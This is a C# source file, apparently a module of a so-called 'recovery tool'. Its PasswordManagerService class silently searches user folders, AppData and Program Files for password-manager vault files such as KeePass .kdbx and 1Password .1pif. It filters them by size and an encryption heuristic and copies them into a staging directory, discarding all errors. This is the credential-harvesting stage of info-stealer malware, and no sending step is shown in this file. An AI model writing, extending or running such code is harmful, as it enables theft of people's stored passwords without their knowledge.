using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Other
{
    public class PasswordManagerService
    {
        private static readonly string[] PasswordManagerExtensions =
        {
            ".kdbx",
            ".keyx",
            ".1pif",
            ".psafe3",
            ".enpass",
            ".rbt",
            ".vault",
            ".db",
            ".sqlite",
            ".pwmgr",
            ".pwdb"
        };

        private static readonly string[] ExcludedFileNames =
        {
            "settings",
            "configuration",
            "config",
            "cache",
            "temp",
            "wrapper",
            "internet",
            "framework",
            "manifest",
            "accessibility",
            "package-lock",
            "windows",
            "log"
        };

        private static readonly string[] DirectoriesToSearch =
        {
            Common.Desktop,
            Common.Downloads,
            Common.LocalData,
            Common.AppData,
            Common.AppDataLow,
            Common.UserProfile,
            Common.CommonAppData,
            Common.ProgramFiles,
            Common.ProgramFilesX86,
            Common.MyDocuments
        };

        private const long MinFileSizeBytes = 128;
        private const long MaxFileSizeBytes = 10 * 1024 * 1024;

        public static async Task SavePasswordManagerAsync()
        {
            string targetPath = Common.EnsurePasswordManagerPath();
            var files = new List<string>();

            foreach (var directory in DirectoriesToSearch)
            {
                if (Directory.Exists(directory))
                {
                    try
                    {
                        var matchedFiles = Directory.EnumerateFiles(directory, "*.*", SearchOption.AllDirectories)
                            .Where(f =>
                                PasswordManagerExtensions.Contains(Path.GetExtension(f), StringComparer.OrdinalIgnoreCase) &&
                                !ExcludedFileNames.Any(ex => Path.GetFileNameWithoutExtension(f).Equals(ex, StringComparison.OrdinalIgnoreCase)) &&
                                ValidateFileSize(f) &&
                                IsEncrypted(f));

                        files.AddRange(matchedFiles);
                    }
                    catch { }
                }
            }

            var copyTasks = files.Select(file => CopyFileAsync(file, targetPath));
            await Task.WhenAll(copyTasks);
        }

        private static bool ValidateFileSize(string filePath)
        {
            var fileInfo = new FileInfo(filePath);
            return fileInfo.Length >= MinFileSizeBytes && fileInfo.Length <= MaxFileSizeBytes;
        }

        private static bool IsEncrypted(string filePath)
        {
            try
            {
                using var stream = File.OpenRead(filePath);
                byte[] buffer = new byte[1024];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead == 0) return false;
                int nonPrintable = buffer.Take(bytesRead).Count(b => b < 32 || b > 126);
                return (double)nonPrintable / bytesRead > 0.8;
            }
            catch
            {
                return false;
            }
        }

        private static async Task CopyFileAsync(string sourcePath, string destinationDirectory)
        {
            string fileName = Path.GetFileName(sourcePath);
            string destinationPath = Path.Combine(destinationDirectory, fileName);

            if (File.Exists(destinationPath))
            {
                string uniqueFileName = $"{Path.GetFileNameWithoutExtension(fileName)}_{Guid.NewGuid()}{Path.GetExtension(fileName)}";
                destinationPath = Path.Combine(destinationDirectory, uniqueFileName);
            }

            using var sourceStream = new FileStream(sourcePath, FileMode.Open, FileAccess.Read, FileShare.Read, bufferSize: 81920, useAsync: true);
            using var destinationStream = new FileStream(destinationPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, bufferSize: 81920, useAsync: true);
            await sourceStream.CopyToAsync(destinationStream);
        }
    }
}
